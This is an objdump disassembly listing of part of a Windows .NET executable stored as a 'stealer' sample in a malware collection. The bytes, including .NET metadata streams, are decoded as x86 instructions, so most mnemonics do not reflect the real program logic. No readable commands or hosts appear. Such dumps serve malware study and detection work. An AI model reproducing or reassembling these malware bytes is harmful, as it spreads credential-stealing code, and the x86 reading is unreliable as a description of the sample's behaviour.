
malware_samples/stealer/6c60efcfb9fed6366ff0eed3e1a80846c1ae0b28e0b289e105e360b2578351b6.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	e0 2b                	loopne 0x40202d
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 58 23 00    	add    %al,0x235800
  402013:	00 54 08 00          	add    %dl,0x0(%eax,%ecx,1)
  402017:	00 01                	add    %al,(%ecx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	de ad be ef 1b 30    	fisubrs 0x301befbe(%ebp)
  402056:	04 00                	add    $0x0,%al
  402058:	3f                   	aas
  402059:	02 00                	add    (%eax),%al
  40205b:	00 01                	add    %al,(%ecx)
  40205d:	00 00                	add    %al,(%eax)
  40205f:	11 1f                	adc    %ebx,(%edi)
  402061:	1c 28                	sbb    $0x28,%al
  402063:	03 00                	add    (%eax),%eax
  402065:	00 0a                	add    %cl,(%edx)
  402067:	72 01                	jb     0x40206a
  402069:	00 00                	add    %al,(%eax)
  40206b:	70 28                	jo     0x402095
  40206d:	04 00                	add    $0x0,%al
  40206f:	00 0a                	add    %cl,(%edx)
  402071:	13 19                	adc    (%ecx),%ebx
  402073:	12 19                	adc    (%ecx),%bl
  402075:	fe                   	(bad)
  402076:	16                   	push   %ss
  402077:	06                   	push   %es
  402078:	00 00                	add    %al,(%eax)
  40207a:	01 6f 05             	add    %ebp,0x5(%edi)
  40207d:	00 00                	add    %al,(%eax)
  40207f:	0a 28                	or     (%eax),%ch
  402081:	06                   	push   %es
  402082:	00 00                	add    %al,(%eax)
  402084:	0a 28                	or     (%eax),%ch
  402086:	07                   	pop    %es
  402087:	00 00                	add    %al,(%eax)
  402089:	0a 0a                	or     (%edx),%cl
  40208b:	06                   	push   %es
  40208c:	28 08                	sub    %cl,(%eax)
  40208e:	00 00                	add    %al,(%eax)
  402090:	0a 26                	or     (%esi),%ah
  402092:	73 09                	jae    0x40209d
  402094:	00 00                	add    %al,(%eax)
  402096:	0a 0b                	or     (%ebx),%cl
  402098:	28 0a                	sub    %cl,(%edx)
  40209a:	00 00                	add    %al,(%eax)
  40209c:	0a 6f 0b             	or     0xb(%edi),%ch
  40209f:	00 00                	add    %al,(%eax)
  4020a1:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4020a4:	19 17                	sbb    %edx,(%edi)
  4020a6:	73 0c                	jae    0x4020b4
  4020a8:	00 00                	add    %al,(%eax)
  4020aa:	0a 0d 09 6f 0d 00    	or     0xd6f09,%cl
  4020b0:	00 0a                	add    %cl,(%edx)
  4020b2:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  4020b5:	1f                   	pop    %ds
  4020b6:	ec                   	in     (%dx),%al
  4020b7:	6a 18                	push   $0x18
  4020b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ba:	0e                   	push   %cs
  4020bb:	00 00                	add    %al,(%eax)
  4020bd:	0a 26                	or     (%esi),%ah
  4020bf:	1f                   	pop    %ds
  4020c0:	14 8d                	adc    $0x8d,%al
  4020c2:	12 00                	adc    (%eax),%al
  4020c4:	00 01                	add    %al,(%ecx)
  4020c6:	13 05 09 11 05 16    	adc    0x16051109,%eax
  4020cc:	1f                   	pop    %ds
  4020cd:	14 6f                	adc    $0x6f,%al
  4020cf:	0f 00 00             	sldt   (%eax)
  4020d2:	0a 26                	or     (%esi),%ah
  4020d4:	1a 8d 12 00 00 01    	sbb    0x1000012(%ebp),%cl
  4020da:	25 d0 01 00 00       	and    $0x1d0,%eax
  4020df:	04 28                	add    $0x28,%al
  4020e1:	11 00                	adc    %eax,(%eax)
  4020e3:	00 0a                	add    %cl,(%edx)
  4020e5:	13 06                	adc    (%esi),%eax
  4020e7:	17                   	pop    %ss
  4020e8:	13 07                	adc    (%edi),%eax
  4020ea:	16                   	push   %ss
  4020eb:	13 08                	adc    (%eax),%ecx
  4020ed:	2b 1a                	sub    (%edx),%ebx
  4020ef:	11 05 1f 10 11 08    	adc    %eax,0x811101f
  4020f5:	58                   	pop    %eax
  4020f6:	91                   	xchg   %eax,%ecx
  4020f7:	11 06                	adc    %eax,(%esi)
  4020f9:	11 08                	adc    %ecx,(%eax)
  4020fb:	91                   	xchg   %eax,%ecx
  4020fc:	2e 05 16 13 07 2b    	cs add $0x2b071316,%eax
  402102:	0b 11                	or     (%ecx),%edx
  402104:	08 17                	or     %dl,(%edi)
  402106:	58                   	pop    %eax
  402107:	13 08                	adc    (%eax),%ecx
  402109:	11 08                	adc    %ecx,(%eax)
  40210b:	1a 32                	sbb    (%edx),%dh
  40210d:	e1 11                	loope  0x402120
  40210f:	07                   	pop    %es
  402110:	2d 05 dd 87 01       	sub    $0x187dd05,%eax
  402115:	00 00                	add    %al,(%eax)
  402117:	11 05 16 28 12 00    	adc    %eax,0x122816
  40211d:	00 0a                	add    %cl,(%edx)
  40211f:	13 09                	adc    (%ecx),%ecx
  402121:	11 05 1e 28 13 00    	adc    %eax,0x13281e
  402127:	00 0a                	add    %cl,(%edx)
  402129:	13 0a                	adc    (%edx),%ecx
  40212b:	11 09                	adc    %ecx,(%ecx)
  40212d:	16                   	push   %ss
  40212e:	6a 31                	push   $0x31
  402130:	0a 11                	or     (%ecx),%dl
  402132:	09 11                	or     %edx,(%ecx)
  402134:	04 1f                	add    $0x1f,%al
  402136:	64 6a 59             	fs push $0x59
  402139:	32 05 dd 5e 01 00    	xor    0x15edd,%al
  40213f:	00 11                	add    %dl,(%ecx)
  402141:	0a 16                	or     (%esi),%dl
  402143:	31 06                	xor    %eax,(%esi)
  402145:	11 0a                	adc    %ecx,(%edx)
  402147:	1f                   	pop    %ds
  402148:	64 31 05 dd 4e 01 00 	xor    %eax,%fs:0x14edd
  40214f:	00 09                	add    %cl,(%ecx)
  402151:	11 09                	adc    %ecx,(%ecx)
  402153:	16                   	push   %ss
  402154:	6f                   	outsl  %ds:(%esi),(%dx)
  402155:	0e                   	push   %cs
  402156:	00 00                	add    %al,(%eax)
  402158:	0a 26                	or     (%esi),%ah
  40215a:	09 1a                	or     %ebx,(%edx)
  40215c:	6a 17                	push   $0x17
  40215e:	6f                   	outsl  %ds:(%esi),(%dx)
  40215f:	0e                   	push   %cs
  402160:	00 00                	add    %al,(%eax)
  402162:	0a 26                	or     (%esi),%ah
  402164:	16                   	push   %ss
  402165:	13 0b                	adc    (%ebx),%ecx
  402167:	38 e5                	cmp    %ah,%ch
  402169:	00 00                	add    %al,(%eax)
  40216b:	00 1a                	add    %bl,(%edx)
  40216d:	8d 12                	lea    (%edx),%edx
  40216f:	00 00                	add    %al,(%eax)
  402171:	01 13                	add    %edx,(%ebx)
  402173:	0c 09                	or     $0x9,%al
  402175:	11 0c 16             	adc    %ecx,(%esi,%edx,1)
  402178:	1a 6f 0f             	sbb    0xf(%edi),%ch
  40217b:	00 00                	add    %al,(%eax)
  40217d:	0a 26                	or     (%esi),%ah
  40217f:	11 0c 16             	adc    %ecx,(%esi,%edx,1)
  402182:	28 13                	sub    %dl,(%ebx)
  402184:	00 00                	add    %al,(%eax)
  402186:	0a 13                	or     (%ebx),%dl
  402188:	0d 11 0d 8d 12       	or     $0x128d0d11,%eax
  40218d:	00 00                	add    %al,(%eax)
  40218f:	01 13                	add    %edx,(%ebx)
  402191:	0e                   	push   %cs
  402192:	09 11                	or     %edx,(%ecx)
  402194:	0e                   	push   %cs
  402195:	16                   	push   %ss
  402196:	11 0d 6f 0f 00 00    	adc    %ecx,0xf6f
  40219c:	0a 26                	or     (%esi),%ah
  40219e:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4021a1:	00 0a                	add    %cl,(%edx)
  4021a3:	11 0e                	adc    %ecx,(%esi)
  4021a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4021a6:	15 00 00 0a 13       	adc    $0x130a0000,%eax
  4021ab:	0f 1e 8d 12 00 00 01 	nopl   0x1000012(%ebp)
  4021b2:	13 10                	adc    (%eax),%edx
  4021b4:	09 11                	or     %edx,(%ecx)
  4021b6:	10 16                	adc    %dl,(%esi)
  4021b8:	1e                   	push   %ds
  4021b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ba:	0f 00 00             	sldt   (%eax)
  4021bd:	0a 26                	or     (%esi),%ah
  4021bf:	11 10                	adc    %edx,(%eax)
  4021c1:	16                   	push   %ss
  4021c2:	28 12                	sub    %dl,(%edx)
  4021c4:	00 00                	add    %al,(%eax)
  4021c6:	0a 13                	or     (%ebx),%dl
  4021c8:	11 06                	adc    %eax,(%esi)
  4021ca:	11 0f                	adc    %ecx,(%edi)
  4021cc:	28 07                	sub    %al,(%edi)
  4021ce:	00 00                	add    %al,(%eax)
  4021d0:	0a 13                	or     (%ebx),%dl
  4021d2:	12 11                	adc    (%ecx),%dl
  4021d4:	12 18                	adc    (%eax),%bl
  4021d6:	18 73 0c             	sbb    %dh,0xc(%ebx)
  4021d9:	00 00                	add    %al,(%eax)
  4021db:	0a 13                	or     (%ebx),%dl
  4021dd:	13 20                	adc    (%eax),%esp
  4021df:	00 40 01             	add    %al,0x1(%eax)
  4021e2:	00 8d 12 00 00 01    	add    %cl,0x1000012(%ebp)
  4021e8:	13 14 11             	adc    (%ecx,%edx,1),%edx
  4021eb:	11 13                	adc    %edx,(%ebx)
  4021ed:	15 2b 30 11 14       	adc    $0x1411302b,%eax
  4021f2:	8e 69 6a             	mov    0x6a(%ecx),%gs
  4021f5:	11 15 28 16 00 00    	adc    %edx,0x1628
  4021fb:	0a 69 13             	or     0x13(%ecx),%ch
  4021fe:	16                   	push   %ss
  4021ff:	09 11                	or     %edx,(%ecx)
  402201:	14 16                	adc    $0x16,%al
  402203:	11 16                	adc    %edx,(%esi)
  402205:	6f                   	outsl  %ds:(%esi),(%dx)
  402206:	0f 00 00             	sldt   (%eax)
  402209:	0a 13                	or     (%ebx),%dl
  40220b:	17                   	pop    %ss
  40220c:	11 13                	adc    %edx,(%ebx)
  40220e:	11 14 16             	adc    %edx,(%esi,%edx,1)
  402211:	11 17                	adc    %edx,(%edi)
  402213:	6f                   	outsl  %ds:(%esi),(%dx)
  402214:	17                   	pop    %ss
  402215:	00 00                	add    %al,(%eax)
  402217:	0a 11                	or     (%ecx),%dl
  402219:	15 11 17 6a 59       	adc    $0x596a1711,%eax
  40221e:	13 15 11 15 16 6a    	adc    0x6a161511,%edx
  402224:	30 ca                	xor    %cl,%dl
  402226:	de 0c 11             	fimuls (%ecx,%edx,1)
  402229:	13 2c 07             	adc    (%edi,%eax,1),%ebp
  40222c:	11 13                	adc    %edx,(%ebx)
  40222e:	6f                   	outsl  %ds:(%esi),(%dx)
  40222f:	18 00                	sbb    %al,(%eax)
  402231:	00 0a                	add    %cl,(%edx)
  402233:	dc 11                	fcoml  (%ecx)
  402235:	0f 72                	(bad)
  402237:	19 00                	sbb    %eax,(%eax)
  402239:	00 70 1b             	add    %dh,0x1b(%eax)
  40223c:	6f                   	outsl  %ds:(%esi),(%dx)
  40223d:	19 00                	sbb    %eax,(%eax)
  40223f:	00 0a                	add    %cl,(%edx)
  402241:	2c 08                	sub    $0x8,%al
  402243:	07                   	pop    %es
  402244:	11 12                	adc    %edx,(%edx)
  402246:	6f                   	outsl  %ds:(%esi),(%dx)
  402247:	1a 00                	sbb    (%eax),%al
  402249:	00 0a                	add    %cl,(%edx)
  40224b:	11 0b                	adc    %ecx,(%ebx)
  40224d:	17                   	pop    %ss
  40224e:	58                   	pop    %eax
  40224f:	13 0b                	adc    (%ebx),%ecx
  402251:	11 0b                	adc    %ecx,(%ebx)
  402253:	11 0a                	adc    %ecx,(%edx)
  402255:	3f                   	aas
  402256:	12 ff                	adc    %bh,%bh
  402258:	ff                   	(bad)
  402259:	ff                   	lcall  (bad)
  40225a:	de 0a                	fimuls (%edx)
  40225c:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  40225f:	09 6f 18             	or     %ebp,0x18(%edi)
  402262:	00 00                	add    %al,(%eax)
  402264:	0a dc                	or     %ah,%bl
  402266:	07                   	pop    %es
  402267:	6f                   	outsl  %ds:(%esi),(%dx)
  402268:	1b 00                	sbb    (%eax),%eax
  40226a:	00 0a                	add    %cl,(%edx)
  40226c:	13 1a                	adc    (%edx),%ebx
  40226e:	2b 10                	sub    (%eax),%edx
  402270:	12 1a                	adc    (%edx),%bl
  402272:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402275:	00 0a                	add    %cl,(%edx)
  402277:	13 18                	adc    (%eax),%ebx
  402279:	11 18                	adc    %ebx,(%eax)
  40227b:	28 02                	sub    %al,(%edx)
  40227d:	00 00                	add    %al,(%eax)
  40227f:	06                   	push   %es
  402280:	12 1a                	adc    (%edx),%bl
  402282:	28 1d 00 00 0a 2d    	sub    %bl,0x2d0a0000
  402288:	e7 de                	out    %eax,$0xde
  40228a:	0e                   	push   %cs
  40228b:	12 1a                	adc    (%edx),%bl
  40228d:	fe                   	(bad)
  40228e:	16                   	push   %ss
  40228f:	02 00                	add    (%eax),%al
  402291:	00 1b                	add    %bl,(%ebx)
  402293:	6f                   	outsl  %ds:(%esi),(%dx)
  402294:	18 00                	sbb    %al,(%eax)
  402296:	00 0a                	add    %cl,(%edx)
  402298:	dc de                	(bad)
  40229a:	03 26                	add    (%esi),%esp
  40229c:	de 00                	fiadds (%eax)
  40229e:	2a 00                	sub    (%eax),%al
  4022a0:	41                   	inc    %ecx
  4022a1:	64 00 00             	add    %al,%fs:(%eax)
  4022a4:	02 00                	add    (%eax),%al
  4022a6:	00 00                	add    %al,(%eax)
  4022a8:	7e 01                	jle    0x4022ab
  4022aa:	00 00                	add    %al,(%eax)
  4022ac:	4a                   	dec    %edx
  4022ad:	00 00                	add    %al,(%eax)
  4022af:	00 c8                	add    %cl,%al
  4022b1:	01 00                	add    %eax,(%eax)
  4022b3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	00 00                	add    %al,(%eax)
  4022ba:	00 00                	add    %al,(%eax)
  4022bc:	02 00                	add    (%eax),%al
  4022be:	00 00                	add    %al,(%eax)
  4022c0:	4c                   	dec    %esp
  4022c1:	00 00                	add    %al,(%eax)
  4022c3:	00 b0 01 00 00 fc    	add    %dh,-0x3ffffff(%eax)
  4022c9:	01 00                	add    %eax,(%eax)
  4022cb:	00 0a                	add    %cl,(%edx)
  4022cd:	00 00                	add    %al,(%eax)
  4022cf:	00 00                	add    %al,(%eax)
  4022d1:	00 00                	add    %al,(%eax)
  4022d3:	00 02                	add    %al,(%edx)
  4022d5:	00 00                	add    %al,(%eax)
  4022d7:	00 0e                	add    %cl,(%esi)
  4022d9:	02 00                	add    (%eax),%al
  4022db:	00 1d 00 00 00 2b    	add    %bl,0x2b000000
  4022e1:	02 00                	add    (%eax),%al
  4022e3:	00 0e                	add    %cl,(%esi)
	...
  4022f1:	00 00                	add    %al,(%eax)
  4022f3:	00 3b                	add    %bh,(%ebx)
  4022f5:	02 00                	add    (%eax),%al
  4022f7:	00 3b                	add    %bh,(%ebx)
  4022f9:	02 00                	add    (%eax),%al
  4022fb:	00 03                	add    %al,(%ebx)
  4022fd:	00 00                	add    %al,(%eax)
  4022ff:	00 01                	add    %al,(%ecx)
  402301:	00 00                	add    %al,(%eax)
  402303:	01 1b                	add    %ebx,(%ebx)
  402305:	30 02                	xor    %al,(%edx)
  402307:	00 2f                	add    %ch,(%edi)
  402309:	00 00                	add    %al,(%eax)
  40230b:	00 02                	add    %al,(%edx)
  40230d:	00 00                	add    %al,(%eax)
  40230f:	11 73 1e             	adc    %esi,0x1e(%ebx)
  402312:	00 00                	add    %al,(%eax)
  402314:	0a 0b                	or     (%ebx),%cl
  402316:	07                   	pop    %es
  402317:	02 6f 1f             	add    0x1f(%edi),%ch
  40231a:	00 00                	add    %al,(%eax)
  40231c:	0a 07                	or     (%edi),%al
  40231e:	02 28                	add    (%eax),%ch
  402320:	20 00                	and    %al,(%eax)
  402322:	00 0a                	add    %cl,(%edx)
  402324:	6f                   	outsl  %ds:(%esi),(%dx)
  402325:	21 00                	and    %eax,(%eax)
  402327:	00 0a                	add    %cl,(%edx)
  402329:	07                   	pop    %es
  40232a:	17                   	pop    %ss
  40232b:	6f                   	outsl  %ds:(%esi),(%dx)
  40232c:	22 00                	and    (%eax),%al
  40232e:	00 0a                	add    %cl,(%edx)
  402330:	07                   	pop    %es
  402331:	0a 06                	or     (%esi),%al
  402333:	28 23                	sub    %ah,(%ebx)
  402335:	00 00                	add    %al,(%eax)
  402337:	0a 26                	or     (%esi),%ah
  402339:	de 03                	fiadds (%ebx)
  40233b:	26 de 00             	fiadds %es:(%eax)
  40233e:	2a 00                	sub    (%eax),%al
  402340:	01 10                	add    %edx,(%eax)
  402342:	00 00                	add    %al,(%eax)
  402344:	00 00                	add    %al,(%eax)
  402346:	00 00                	add    %al,(%eax)
  402348:	2b 2b                	sub    (%ebx),%ebp
  40234a:	00 03                	add    %al,(%ebx)
  40234c:	01 00                	add    %eax,(%eax)
  40234e:	00 01                	add    %al,(%ecx)
  402350:	1e                   	push   %ds
  402351:	02 28                	add    (%eax),%ch
  402353:	24 00                	and    $0x0,%al
  402355:	00 0a                	add    %cl,(%edx)
  402357:	2a 42 53             	sub    0x53(%edx),%al
  40235a:	4a                   	dec    %edx
  40235b:	42                   	inc    %edx
  40235c:	01 00                	add    %eax,(%eax)
  40235e:	01 00                	add    %eax,(%eax)
  402360:	00 00                	add    %al,(%eax)
  402362:	00 00                	add    %al,(%eax)
  402364:	0c 00                	or     $0x0,%al
  402366:	00 00                	add    %al,(%eax)
  402368:	76 34                	jbe    0x40239e
  40236a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40236d:	33 30                	xor    (%eax),%esi
  40236f:	33 31                	xor    (%ecx),%esi
  402371:	39 00                	cmp    %eax,(%eax)
  402373:	00 00                	add    %al,(%eax)
  402375:	00 05 00 6c 00 00    	add    %al,0x6c00
  40237b:	00 a4 02 00 00 23 7e 	add    %ah,0x7e230000(%edx,%eax,1)
  402382:	00 00                	add    %al,(%eax)
  402384:	10 03                	adc    %al,(%ebx)
  402386:	00 00                	add    %al,(%eax)
  402388:	e0 03                	loopne 0x40238d
  40238a:	00 00                	add    %al,(%eax)
  40238c:	23 53 74             	and    0x74(%ebx),%edx
  40238f:	72 69                	jb     0x4023fa
  402391:	6e                   	outsb  %ds:(%esi),(%dx)
  402392:	67 73 00             	addr16 jae 0x402395
  402395:	00 00                	add    %al,(%eax)
  402397:	00 f0                	add    %dh,%al
  402399:	06                   	push   %es
  40239a:	00 00                	add    %al,(%eax)
  40239c:	24 00                	and    $0x0,%al
  40239e:	00 00                	add    %al,(%eax)
  4023a0:	23 55 53             	and    0x53(%ebp),%edx
  4023a3:	00 14 07             	add    %dl,(%edi,%eax,1)
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	10 00                	adc    %al,(%eax)
  4023aa:	00 00                	add    %al,(%eax)
  4023ac:	23 47 55             	and    0x55(%edi),%eax
  4023af:	49                   	dec    %ecx
  4023b0:	44                   	inc    %esp
  4023b1:	00 00                	add    %al,(%eax)
  4023b3:	00 24 07             	add    %ah,(%edi,%eax,1)
  4023b6:	00 00                	add    %al,(%eax)
  4023b8:	30 01                	xor    %al,(%ecx)
  4023ba:	00 00                	add    %al,(%eax)
  4023bc:	23 42 6c             	and    0x6c(%edx),%eax
  4023bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4023c0:	62 00                	bound  %eax,(%eax)
  4023c2:	00 00                	add    %al,(%eax)
  4023c4:	00 00                	add    %al,(%eax)
  4023c6:	00 00                	add    %al,(%eax)
  4023c8:	02 00                	add    (%eax),%al
  4023ca:	00 01                	add    %al,(%ecx)
  4023cc:	57                   	push   %edi
  4023cd:	15 02 28 09 00       	adc    $0x92802,%eax
  4023d2:	00 00                	add    %al,(%eax)
  4023d4:	00 fa                	add    %bh,%dl
  4023d6:	25 33 00 16 00       	and    $0x160033,%eax
  4023db:	00 01                	add    %al,(%ecx)
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	00 1e                	add    %bl,(%esi)
  4023e1:	00 00                	add    %al,(%eax)
  4023e3:	00 03                	add    %al,(%ebx)
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	00 01                	add    %al,(%ecx)
  4023e9:	00 00                	add    %al,(%eax)
  4023eb:	00 03                	add    %al,(%ebx)
  4023ed:	00 00                	add    %al,(%eax)
  4023ef:	00 01                	add    %al,(%ecx)
  4023f1:	00 00                	add    %al,(%eax)
  4023f3:	00 24 00             	add    %ah,(%eax,%eax,1)
  4023f6:	00 00                	add    %al,(%eax)
  4023f8:	03 00                	add    (%eax),%eax
  4023fa:	00 00                	add    %al,(%eax)
  4023fc:	02 00                	add    (%eax),%al
  4023fe:	00 00                	add    %al,(%eax)
  402400:	02 00                	add    (%eax),%al
  402402:	00 00                	add    %al,(%eax)
  402404:	01 00                	add    %eax,(%eax)
  402406:	00 00                	add    %al,(%eax)
  402408:	01 00                	add    %eax,(%eax)
  40240a:	00 00                	add    %al,(%eax)
  40240c:	02 00                	add    (%eax),%al
  40240e:	00 00                	add    %al,(%eax)
  402410:	00 00                	add    %al,(%eax)
  402412:	0a 00                	or     (%eax),%al
  402414:	01 00                	add    %eax,(%eax)
  402416:	00 00                	add    %al,(%eax)
  402418:	00 00                	add    %al,(%eax)
  40241a:	06                   	push   %es
  40241b:	00 3f                	add    %bh,(%edi)
  40241d:	00 38                	add    %bh,(%eax)
  40241f:	00 06                	add    %al,(%esi)
  402421:	00 88 00 68 00 06    	add    %cl,0x6006800(%eax)
  402427:	00 a8 00 68 00 06    	add    %ch,0x6006800(%eax)
  40242d:	00 d0                	add    %dl,%al
  40242f:	00 38                	add    %bh,(%eax)
  402431:	00 13                	add    %dl,(%ebx)
  402433:	00 dc                	add    %bl,%ah
  402435:	00 00                	add    %al,(%eax)
  402437:	00 06                	add    %al,(%esi)
  402439:	00 f8                	add    %bh,%al
  40243b:	00 38                	add    %bh,(%eax)
  40243d:	00 06                	add    %al,(%esi)
  40243f:	00 0e                	add    %cl,(%esi)
  402441:	01 38                	add    %edi,(%eax)
  402443:	00 06                	add    %al,(%esi)
  402445:	00 26                	add    %ah,(%esi)
  402447:	01 1c 01             	add    %ebx,(%ecx,%eax,1)
  40244a:	06                   	push   %es
  40244b:	00 33                	add    %dh,(%ebx)
  40244d:	01 1c 01             	add    %ebx,(%ecx,%eax,1)
  402450:	06                   	push   %es
  402451:	00 3d 01 1c 01 06    	add    %bh,0x6011c01
  402457:	00 76 01             	add    %dh,0x1(%esi)
  40245a:	5b                   	pop    %ebx
  40245b:	01 06                	add    %eax,(%esi)
  40245d:	00 8f 01 7d 01 06    	add    %cl,0x6017d01(%edi)
  402463:	00 ba 01 1c 01 06    	add    %bh,0x6011c01(%edx)
  402469:	00 c5                	add    %al,%ch
  40246b:	01 1c 01             	add    %ebx,(%ecx,%eax,1)
  40246e:	06                   	push   %es
  40246f:	00 ce                	add    %cl,%dh
  402471:	01 1c 01             	add    %ebx,(%ecx,%eax,1)
  402474:	06                   	push   %es
  402475:	00 d9                	add    %bl,%cl
  402477:	01 1c 01             	add    %ebx,(%ecx,%eax,1)
  40247a:	06                   	push   %es
  40247b:	00 eb                	add    %ch,%bl
  40247d:	01 1c 01             	add    %ebx,(%ecx,%eax,1)
  402480:	06                   	push   %es
  402481:	00 fb                	add    %bh,%bl
  402483:	01 38                	add    %edi,(%eax)
  402485:	00 06                	add    %al,(%esi)
  402487:	00 4a 02             	add    %cl,0x2(%edx)
  40248a:	68 00 06 00 79       	push   $0x79000600
  40248f:	02 68 00             	add    0x0(%eax),%ch
  402492:	06                   	push   %es
  402493:	00 88 02 38 00 06    	add    %cl,0x6003802(%eax)
  402499:	00 8e 02 38 00 06    	add    %cl,0x6003802(%esi)
  40249f:	00 b1 02 38 00 06    	add    %dh,0x6003802(%ecx)
  4024a5:	00 da                	add    %bl,%dl
  4024a7:	02 ce                	add    %dh,%cl
  4024a9:	02 06                	add    (%esi),%al
  4024ab:	00 f6                	add    %dh,%dh
  4024ad:	02 38                	add    (%eax),%bh
  4024af:	00 06                	add    %al,(%esi)
  4024b1:	00 05 03 38 00 06    	add    %al,0x6003803
  4024b7:	00 19                	add    %bl,(%ecx)
  4024b9:	03 38                	add    (%eax),%edi
  4024bb:	00 2f                	add    %ch,(%edi)
  4024bd:	00 37                	add    %dh,(%edi)
  4024bf:	03 00                	add    (%eax),%eax
  4024c1:	00 0a                	add    %cl,(%edx)
  4024c3:	00 78 03             	add    %bh,0x3(%eax)
  4024c6:	65 03 0a             	add    %gs:(%edx),%ecx
  4024c9:	00 d0                	add    %dl,%al
  4024cb:	03 65 03             	add    0x3(%ebp),%esp
  4024ce:	00 00                	add    %al,(%eax)
  4024d0:	00 00                	add    %al,(%eax)
  4024d2:	01 00                	add    %eax,(%eax)
  4024d4:	00 00                	add    %al,(%eax)
  4024d6:	00 00                	add    %al,(%eax)
  4024d8:	01 00                	add    %eax,(%eax)
  4024da:	01 00                	add    %eax,(%eax)
  4024dc:	00 00                	add    %al,(%eax)
  4024de:	10 00                	adc    %al,(%eax)
  4024e0:	18 00                	sbb    %al,(%eax)
  4024e2:	20 00                	and    %al,(%eax)
  4024e4:	05 00 01 00 01       	add    $0x1000100,%eax
  4024e9:	00 00                	add    %al,(%eax)
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	00 05 02 00 00 05    	add    %al,0x5000002
  4024f3:	00 01                	add    %al,(%ecx)
  4024f5:	00 04 00             	add    %al,(%eax,%eax,1)
  4024f8:	13 01                	adc    (%ecx),%eax
  4024fa:	65 02 63 00          	add    %gs:0x0(%ebx),%ah
  4024fe:	54                   	push   %esp
  4024ff:	20 00                	and    %al,(%eax)
  402501:	00 00                	add    %al,(%eax)
  402503:	00 91 00 46 00 0a    	add    %dl,0xa004600(%ecx)
  402509:	00 01                	add    %al,(%ecx)
  40250b:	00 04 23             	add    %al,(%ebx,%eiz,1)
  40250e:	00 00                	add    %al,(%eax)
  402510:	00 00                	add    %al,(%eax)
  402512:	91                   	xchg   %eax,%ecx
  402513:	00 4b 00             	add    %cl,0x0(%ebx)
  402516:	0e                   	push   %cs
  402517:	00 01                	add    %al,(%ecx)
  402519:	00 50 23             	add    %dl,0x23(%eax)
  40251c:	00 00                	add    %al,(%eax)
  40251e:	00 00                	add    %al,(%eax)
  402520:	86 18                	xchg   %bl,(%eax)
  402522:	5a                   	pop    %edx
  402523:	00 13                	add    %dl,(%ebx)
  402525:	00 02                	add    %al,(%edx)
  402527:	00 00                	add    %al,(%eax)
  402529:	00 01                	add    %al,(%ecx)
  40252b:	00 60 00             	add    %ah,0x0(%eax)
  40252e:	11 00                	adc    %eax,(%eax)
  402530:	5a                   	pop    %edx
  402531:	00 17                	add    %dl,(%edi)
  402533:	00 19                	add    %bl,(%ecx)
  402535:	00 5a 00             	add    %bl,0x0(%edx)
  402538:	13 00                	adc    (%eax),%eax
  40253a:	21 00                	and    %eax,(%eax)
  40253c:	ea 00 1c 00 31 00 fd 	ljmp   $0xfd00,$0x31001c00
  402543:	00 22                	add    %ah,(%edx)
  402545:	00 09                	add    %cl,(%ecx)
  402547:	00 05 01 27 00 39    	add    %al,0x39002701
  40254d:	00 15 01 2b 00 41    	add    %dl,0x41002b01
  402553:	00 2b                	add    %ch,(%ebx)
  402555:	01 2b                	add    %ebp,(%ebx)
  402557:	00 49 00             	add    %cl,0x0(%ecx)
  40255a:	4b                   	dec    %ebx
  40255b:	01 31                	add    %esi,(%ecx)
  40255d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402560:	5a                   	pop    %edx
  402561:	00 13                	add    %dl,(%ebx)
  402563:	00 61 00             	add    %ah,0x0(%ecx)
  402566:	98                   	cwtl
  402567:	01 3d 00 61 00 ad    	add    %edi,0xad006100
  40256d:	01 27                	add    %esp,(%edi)
  40256f:	00 69 00             	add    %ch,0x0(%ecx)
  402572:	5a                   	pop    %edx
  402573:	00 42 00             	add    %al,0x0(%edx)
  402576:	81 00 e0 01 4b 00    	addl   $0x4b01e0,(%eax)
  40257c:	81 00 f6 01 4f 00    	addl   $0x4f01f6,(%eax)
  402582:	81 00 00 02 56 00    	addl   $0x560200,(%eax)
  402588:	99                   	cltd
  402589:	00 5a 00             	add    %bl,0x0(%edx)
  40258c:	13 00                	adc    (%eax),%eax
  40258e:	a1 00 a1 02 66       	mov    0x6602a100,%eax
  402593:	00 b9 00 be 02 6e    	add    %bh,0x6e02be00(%ecx)
  402599:	00 b9 00 c6 02 75    	add    %bh,0x7502c600(%ecx)
  40259f:	00 c1                	add    %al,%cl
  4025a1:	00 e3                	add    %ah,%bl
  4025a3:	02 7c 00 c1          	add    -0x3f(%eax,%eax,1),%bh
  4025a7:	00 ec                	add    %ch,%ah
  4025a9:	02 81 00 c9 00 fb    	add    -0x4ff3700(%ecx),%al
  4025af:	02 87 00 81 00 ff    	add    -0xff7f00(%edi),%al
  4025b5:	02 8d 00 d1 00 11    	add    0x1100d100(%ebp),%cl
  4025bb:	03 13                	add    (%ebx),%edx
  4025bd:	00 39                	add    %bh,(%ecx)
  4025bf:	00 2a                	add    %ch,(%edx)
  4025c1:	03 95 00 0c 00 33    	add    0x33000c00(%ebp),%edx
  4025c7:	03 9c 00 0c 00 42 03 	add    0x342000c(%eax,%eax,1),%ebx
  4025ce:	a2 00 14 00 50       	mov    %al,0x50001400
